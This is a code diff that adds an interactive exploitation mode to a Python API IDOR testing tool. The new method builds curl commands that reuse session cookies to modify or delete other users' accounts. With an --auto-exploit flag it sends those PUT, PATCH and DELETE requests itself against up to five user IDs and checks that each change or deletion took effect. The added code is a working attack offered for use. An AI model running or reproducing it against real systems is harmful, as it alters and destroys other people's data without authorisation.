@@ -490,6 +490,11 @@ class APIIDORTester:
                                 response_body=response.text[:5000]
                             )
                             results.append(result)
+                            
+                            # Offer exploitation
+                            if method in ['PUT', 'PATCH', 'DELETE']:
+                                vulnerable_uids = list(range(1, min(len(self.discovered_users) + 1, 11)))
+                                self.exploit_api_vulnerability(api_url, method, user_data, vulnerable_uids)
                     
                     # Check if DELETE worked
                     elif method == 'DELETE':
@@ -648,6 +653,163 @@ class APIIDORTester:
                 time.sleep(0.05)  # Small delay
         
         return results
+    
+
+    def exploit_api_vulnerability(self, endpoint: str, method: str, user_data: Dict, vulnerable_uids: List[int]):
+        """Interactive exploitation of discovered API vulnerabilities"""
+        print(f"\n{Colors.BOLD}{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.RED}║              EXPLOITATION MODE - Interactive Attack               ║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.RED}╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}[!] Vulnerable method detected:{Colors.RESET} {Colors.RED}{method}{Colors.RESET}")
+        print(f"{Colors.CYAN}Endpoint:{Colors.RESET} {endpoint}")
+        print(f"{Colors.CYAN}Vulnerable UIDs:{Colors.RESET} {', '.join(map(str, vulnerable_uids[:5]))}{'...' if len(vulnerable_uids) > 5 else ''}")
+        
+        if not self.args.auto_exploit:
+            print(f"\n{Colors.YELLOW}[*] To enable auto-exploitation, use --auto-exploit flag{Colors.RESET}")
+            print(f"\n{Colors.CYAN}Manual exploitation commands:{Colors.RESET}\n")
+            
+            # Generate curl commands for manual exploitation
+            for uid in vulnerable_uids[:3]:
+                test_url = self._build_api_url(endpoint, 'uid', uid)
+                
+                if method == 'PUT':
+                    # Suggest data modification
+                    modified_data = user_data.copy()
+                    modified_data['about'] = 'EXPLOITED_BY_GHOSTOPS'
+                    modified_data['uid'] = uid
+                    
+                    # Build curl command
+                    curl_parts = []
+                    curl_parts.append(f"curl -X PUT '{test_url}'")
+                    curl_parts.append("  -H 'Content-Type: application/json'")
+                    for cookie_name, cookie_value in self.session.cookies.items():
+                        curl_parts.append(f"  -b '{cookie_name}={cookie_value}'")
+                    curl_parts.append(f"  -d '{json.dumps(modified_data)}'")
+                    curl_cmd = " \\\n".join(curl_parts)
+                    
+                    print(f"{Colors.GREEN}# Modify user {uid}:{Colors.RESET}")
+                    print(f"{curl_cmd}\n")
+                
+                elif method == 'DELETE':
+                    # Build curl command
+                    curl_parts = []
+                    curl_parts.append(f"curl -X DELETE '{test_url}'")
+                    for cookie_name, cookie_value in self.session.cookies.items():
+                        curl_parts.append(f"  -b '{cookie_name}={cookie_value}'")
+                    curl_cmd = " \\\n".join(curl_parts)
+                    
+                    print(f"{Colors.RED}# Delete user {uid}:{Colors.RESET}")
+                    print(f"{curl_cmd}\n")
+                
+                elif method == 'PATCH':
+                    patch_data = {'about': 'EXPLOITED_BY_GHOSTOPS'}
+                    
+                    # Build curl command
+                    curl_parts = []
+                    curl_parts.append(f"curl -X PATCH '{test_url}'")
+                    curl_parts.append("  -H 'Content-Type: application/json'")
+                    for cookie_name, cookie_value in self.session.cookies.items():
+                        curl_parts.append(f"  -b '{cookie_name}={cookie_value}'")
+                    curl_parts.append(f"  -d '{json.dumps(patch_data)}'")
+                    curl_cmd = " \\\n".join(curl_parts)
+                    
+                    print(f"{Colors.YELLOW}# Patch user {uid}:{Colors.RESET}")
+                    print(f"{curl_cmd}\n")
+            
+            print(f"{Colors.CYAN}Python exploitation example:{Colors.RESET}\n")
+            print(f"python3 {sys.argv[0]} \\")
+            print(f"  --exploit-api \\")
+            print(f"  -u '{endpoint}' \\")
+            print(f"  --target-uid {vulnerable_uids[0]} \\")
+            print(f"  --exploit-method {method}\n")
+            
+            return
+        
+        # Auto-exploitation mode
+        print(f"\n{Colors.BOLD}{Colors.RED}[!] AUTO-EXPLOITATION ENABLED{Colors.RESET}")
+        print(f"{Colors.YELLOW}[*] This will modify live data on the target!{Colors.RESET}")
+        
+        # Ask for confirmation
+        try:
+            confirm = input(f"\n{Colors.BOLD}Continue? (yes/no): {Colors.RESET}").strip().lower()
+            if confirm not in ['yes', 'y']:
+                print(f"{Colors.YELLOW}[*] Exploitation cancelled{Colors.RESET}")
+                return
+        except:
+            print(f"\n{Colors.YELLOW}[*] Exploitation cancelled{Colors.RESET}")
+            return
+        
+        print(f"\n{Colors.GREEN}[+] Starting exploitation...{Colors.RESET}\n")
+        
+        # Exploit each vulnerable UID
+        exploit_results = []
+        
+        for uid in vulnerable_uids[:5]:  # Limit to first 5 for safety
+            test_url = self._build_api_url(endpoint, 'uid', uid)
+            
+            try:
+                if method == 'PUT':
+                    # Modify user data
+                    modified_data = user_data.copy()
+                    modified_data['about'] = f'EXPLOITED_BY_GHOSTOPS_{time.time()}'
+                    modified_data['uid'] = uid
+                    
+                    response = self.session.put(test_url, json=modified_data, timeout=10)
+                    
+                    if response.status_code in [200, 201]:
+                        # Verify modification
+                        verify_resp = self.session.get(test_url, timeout=5)
+                        if 'EXPLOITED_BY_GHOSTOPS' in verify_resp.text:
+                            print(f"  {Colors.GREEN}[+] Successfully modified user {uid}{Colors.RESET}")
+                            exploit_results.append({'uid': uid, 'method': 'PUT', 'success': True})
+                        else:
+                            print(f"  {Colors.YELLOW}[-] Modification not verified for user {uid}{Colors.RESET}")
+                    else:
+                        print(f"  {Colors.RED}[-] Failed to modify user {uid}: {response.status_code}{Colors.RESET}")
+                
+                elif method == 'DELETE':
+                    response = self.session.delete(test_url, timeout=10)
+                    
+                    if response.status_code in [200, 204]:
+                        # Verify deletion
+                        verify_resp = self.session.get(test_url, timeout=5)
+                        if verify_resp.status_code == 404:
+                            print(f"  {Colors.GREEN}[+] Successfully deleted user {uid}{Colors.RESET}")
+                            exploit_results.append({'uid': uid, 'method': 'DELETE', 'success': True})
+                        else:
+                            print(f"  {Colors.YELLOW}[-] Deletion not verified for user {uid}{Colors.RESET}")
+                    else:
+                        print(f"  {Colors.RED}[-] Failed to delete user {uid}: {response.status_code}{Colors.RESET}")
+                
+                elif method == 'PATCH':
+                    patch_data = {'about': f'EXPLOITED_BY_GHOSTOPS_{time.time()}'}
+                    response = self.session.patch(test_url, json=patch_data, timeout=10)
+                    
+                    if response.status_code in [200, 201]:
+                        verify_resp = self.session.get(test_url, timeout=5)
+                        if 'EXPLOITED_BY_GHOSTOPS' in verify_resp.text:
+                            print(f"  {Colors.GREEN}[+] Successfully patched user {uid}{Colors.RESET}")
+                            exploit_results.append({'uid': uid, 'method': 'PATCH', 'success': True})
+                        else:
+                            print(f"  {Colors.YELLOW}[-] Patch not verified for user {uid}{Colors.RESET}")
+                    else:
+                        print(f"  {Colors.RED}[-] Failed to patch user {uid}: {response.status_code}{Colors.RESET}")
+                
+                time.sleep(0.1)  # Small delay
+                
+            except Exception as e:
+                print(f"  {Colors.RED}[!] Error exploiting user {uid}: {e}{Colors.RESET}")
+        
+        # Summary
+        successful = [r for r in exploit_results if r['success']]
+        print(f"\n{Colors.BOLD}{Colors.GREEN}[+] Exploitation Summary:{Colors.RESET}")
+        print(f"  {Colors.CYAN}Attempted:{Colors.RESET} {len(exploit_results)}")
+        print(f"  {Colors.GREEN}Successful:{Colors.RESET} {len(successful)}")
+        print(f"  {Colors.RED}Failed:{Colors.RESET} {len(exploit_results) - len(successful)}")
+        
+        if successful:
+            print(f"\n{Colors.RED}[!] Successfully exploited UIDs:{Colors.RESET} {', '.join(str(r['uid']) for r in successful)}")
     
     def run_comprehensive_api_test(self, url: str) -> List[IDORResult]:
         """Run comprehensive API IDOR testing"""
@@ -2608,6 +2770,14 @@ def main():
                        help='Auto-detect IDOR patterns and exploit')
     parser.add_argument('--api-test', action='store_true',
                        help='Comprehensive API IDOR testing (GET/POST/PUT/DELETE)')
+    parser.add_argument('--auto-exploit', action='store_true',
+                       help='Automatically exploit discovered vulnerabilities (DANGEROUS!)')
+    parser.add_argument('--exploit-api', action='store_true',
+                       help='Manual API exploitation mode')
+    parser.add_argument('--target-uid', type=int,
+                       help='Target UID for manual exploitation')
+    parser.add_argument('--exploit-method', choices=['PUT', 'PATCH', 'DELETE'],
+                       help='Exploitation method to use')
     parser.add_argument('--fuzz-range', help='Range for fuzzing (format: 1-100)')
     parser.add_argument('--advanced', action='store_true',
                        help='Enable advanced tests (JWT alg=none, etc.)')
